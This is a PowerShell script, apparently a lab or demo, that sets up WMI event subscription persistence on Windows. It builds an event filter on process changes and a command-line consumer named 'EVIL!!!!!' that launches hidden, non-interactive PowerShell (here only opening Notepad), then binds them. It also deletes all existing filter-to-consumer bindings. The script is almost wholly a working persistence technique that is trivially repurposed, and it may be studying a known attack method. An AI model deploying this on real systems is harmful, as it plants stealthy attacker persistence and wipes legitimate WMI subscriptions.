# List any Event Filters
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -ComputerName . -Filter "Name='NotepadFilter'" | Remove-WmiObject


# List event Consumers
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -ComputerName . -Filter "Name='NotepadConsumer'" | Remove-WmiObject


# List any Bindings
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -ComputerName . | Remove-WmiObject


# Creating a new event filter
$instanceFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()


# Change the properties of the object
$instanceFilter.QueryLanguage = "WQL"
$instanceFilter.Query = "select * from __instanceModificationEvent within 2 where
                            TargetInstance ISA 'win32_process'"
$instanceFilter.Name = "NotepadFilter"
$instanceFilter.EventNamespace = "root\cimv2"


# View the properties and methods of the object
#$instanceFilter | gm -View All
#$instanceFilter | gm -MemberType Methods -View All


# Save the filter
$result = $instanceFilter.Put()


# Save the file path of the filter for the consumer
$newFilter = $result.Path
$newFilter


# Create the consumer
#$instanceConsumer = ([wmiclass]"\\COMP165\root\subscription:CommandLineEventConsumer").CreateInstance()


# View the properties of the consumer
#$instanceConsumer | gm -View All

$exePath = "powershell.exe -nop -noni -w hidden -c `"notepad.exe`""
$cmdPath = "C:\Windows\system32\cmd.exe"

# Change the properties of the consumer object
#$instanceConsumer.Name = "NotepadConsumer"
#$instanceConsumer.ExecutablePath = "$env:SystemDrive\Windows\notepad.exe"
#$instanceConsumer.ExecutablePath = $exePath
#$instanceConsumer.CommandLineTemplate = "C:\Windows\system32\cmd.exe powershell.exe start-process calc.exe"
#$instanceConsumer.RunInteractively = $false



$instanceConsumer = Set-WmiInstance -Class 'CommandLineEventConsumer' -ComputerName . -Namespace "root\subscription" `
        -Arguments @{
            name="EVIL!!!!!"
            CommandLineTemplate="$exePath"
            }



#$consumer = Set-WmiInstance -Namespace "root\subscription" `
#                            -Class 'CommandLineEventConsumer' `
#                            -Arguments @{ name="DoBadThings"
#                                          CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerS hell\v1.0\powershell.exe -NonInteractive"
#                                          RunInteractively='false'
#                                          }





# Save the object
$consumerResult = $instanceConsumer.Put()
$consumerPath = $consumerResult.Path
$consumerPath


# Bind filter and consumer
$instanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()


# Change the binding properties
$instanceBinding.Filter = $newFilter
$instanceBinding.Consumer = $instanceConsumer


# Save the object
$bindingResult = $instanceBinding.Put()


# Save the path in order to delete the binding in the future
$newBinding = $bindingResult.Path
$newBinding




#Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe



([wmi]$instanceConsumer).Delete()